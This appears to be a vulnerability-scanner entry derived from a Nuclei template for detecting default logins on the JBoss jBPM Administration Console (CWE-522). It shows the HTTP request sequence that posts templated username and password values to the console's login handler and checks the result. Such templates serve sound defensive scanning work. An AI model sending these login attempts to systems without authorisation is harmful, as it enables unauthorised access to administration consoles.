# Vulnerability: JBoss jBPM Administration Console Default Login - Detect
**Classification:** CWE-522
**Source:** Nuclei Template (`jboss-jbpm-default-login.yaml`)

## Description
JBoss jBPM Administration Console default login information was detected.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /jbpm-console/app/tasks.jsf HTTP/1.1
Host: {{Hostname}}

POST /jbpm-console/app/j_security_check HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

j_username={{user}}&j_password={{pass}}

GET /jbpm-console/app/tasks.jsf HTTP/1.1
Host: {{Hostname}}
```

